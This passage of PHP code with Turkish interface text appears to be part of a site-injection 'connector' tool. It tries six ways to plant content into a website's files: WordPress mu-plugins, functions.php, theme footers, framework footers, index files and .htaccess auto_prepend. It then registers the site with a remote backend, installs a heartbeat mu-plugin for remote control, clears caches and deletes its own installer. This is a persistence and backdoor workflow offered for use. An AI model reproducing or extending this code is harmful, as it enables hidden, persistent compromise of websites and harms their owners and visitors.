
if (isset($_GET['inject'])) {
    echo "<h2>Enjeksiyon ve Register</h2>";

    $result = inject_link();

    if ($result['success'] && !empty($result['injected'])) {
        echo "<div class='success'><strong>1) Enjeksiyon başarılı:</strong> " . htmlspecialchars($result['message']);
        if (isset($result['footer_path'])) echo "<br>Dosya: <code>" . htmlspecialchars($result['footer_path']) . "</code>";
        if (isset($result['method']))      echo "<br>Yöntem: <code>" . htmlspecialchars($result['method']) . "</code>";
        echo "</div>";


        $reg = register_with_backend($base, $site_type, $result);
        if ($reg['ok'] && !empty($reg['data']['success'])) {
            $siteToken = $reg['data']['data']['site_token'] ?? '';
            $siteId    = $reg['data']['data']['site_id']    ?? 0;
            echo "<div class='success'>";
            echo "<strong>2) Backend kaydı başarılı.</strong><br>";
            echo "Site ID: <code>$siteId</code><br>";
            echo "Site Token: <code>" . htmlspecialchars(substr($siteToken, 0, 16)) . "...</code><br>";
            echo "</div>";

            if ($site_type === 'wordpress' && $siteToken !== '') {
                $mu = write_managed_mu_plugin($base, $siteToken);
                if ($mu['success']) {
                    echo "<div class='success'>";
                    echo "<strong>3) Managed mu-plugin kuruldu.</strong> Cron heartbeat aktif.<br>";
                    echo "Yol: <code>" . htmlspecialchars($mu['path']) . "</code><br>";
                    echo "Heartbeat sıklığı: 15 dakika (wp-cron).";
                    echo "</div>";
                } else {
                    echo "<div class='warning'>Managed mu-plugin yazılamadı: " . htmlspecialchars($mu['message']) . " — site çalışır ama uzaktan yönetilemez.</div>";
                }
            }
        } else {
            $errMsg = $reg['data']['message'] ?? ($reg['msg'] ?? 'bilinmeyen hata');
            echo "<div class='warning'>";
            echo "<strong>2) Backend kaydı başarısız:</strong> " . htmlspecialchars($errMsg) . "<br>";
            echo "HTTP: " . (int)($reg['http'] ?? 0) . "<br>";
            echo "Site enjeksiyon olarak çalışır ama panelden yönetilemez.";
            echo "</div>";
        }

        $cleared = clear_all_cache($base, $site_type);
        if (!empty($cleared)) {
            echo "<div class='info'><strong>Cache temizlendi:</strong> " . htmlspecialchars(implode(', ', $cleared)) . "</div>";
        }

        echo "<div class='warning'>";
        echo "<strong>SON ADIM:</strong> Bu kurulum dosyasını silmek için butona bas.";
        echo "<br><a href='?delete=1&key=" . urlencode($_GET['key'] ?? '') . "' class='btn btn-danger'>Connector dosyasını sil</a>";
        echo "</div>";
    } else {
        echo "<div class='error'><strong>Hata:</strong> " . htmlspecialchars($result['message']) . "</div>";
    }

    echo "<p><a href='?key=" . urlencode($_GET['key'] ?? '') . "' class='btn btn-secondary'>Geri dön</a></p>";

} elseif (isset($_GET['delete'])) {
    $del = self_delete_connector();
    if (!empty($del['deleted'])) {
        echo "<div class='success'>Silindi: " . htmlspecialchars(implode(', ', $del['deleted'])) . "</div>";
        echo "<div class='info'>Bu sayfayı kapatabilirsin. Connector mu-plugin olarak çalışmaya devam ediyor.</div>";
    }
    if (!empty($del['failed'])) {
        echo "<div class='error'>Silinemedi: " . htmlspecialchars(implode(', ', $del['failed'])) . " — manuel olarak sil.</div>";
    }
} elseif (isset($_GET['clear_cache'])) {
    $cleared = clear_all_cache($base, $site_type);
    echo "<div class='success'>Cache temizlendi: " . htmlspecialchars(implode(', ', $cleared) ?: 'hiçbir şey bulunamadı') . "</div>";
    echo "<p><a href='?key=" . urlencode($_GET['key'] ?? '') . "' class='btn btn-secondary'>Geri dön</a></p>";
} else {
    echo "<h2>Otomatik Kurulum</h2>";
    echo "<p>Bu connector aşağıdaki sırayla 6 farklı yöntem dener:</p>";
    echo "<ol>";
    echo "<li><strong>WordPress MU-Plugin</strong> (managed → backend ile yönetilebilir)</li>";
    echo "<li>WordPress functions.php hook</li>";
    echo "<li>WordPress aktif tema footer.php</li>";
    echo "<li>Framework footer dosyaları (Laravel, Joomla, Drupal, vb.)</li>";
    echo "<li>index.php / index.html</li>";
    echo "<li>.htaccess auto_prepend (PHP-FPM dostu IfModule wrap)</li>";
    echo "</ol>";

    if ($site_type === 'wordpress') {
        echo "<div class='info'><strong>WordPress algılandı.</strong> MU-Plugin yöntemiyle kurulacak ve backend ile heartbeat bağlantısı kurulacak.</div>";
    } elseif ($site_type === 'static' || $site_type === 'php') {
        echo "<div class='warning'>WordPress dışı site: enjeksiyon yapılır, backend kaydı olur ama uzaktan yönetim (heartbeat) yok.</div>";
    }

    echo "<a href='?inject=1&key=" . urlencode($_GET['key'] ?? '') . "' class='btn'>Otomatik Kurulumu Başlat</a>";
    echo "<a href='?clear_cache=1&key=" . urlencode($_GET['key'] ?? '') . "' class='btn btn-secondary'>Sadece Cache Temizle</a>";
}

echo "</div></body></html>";
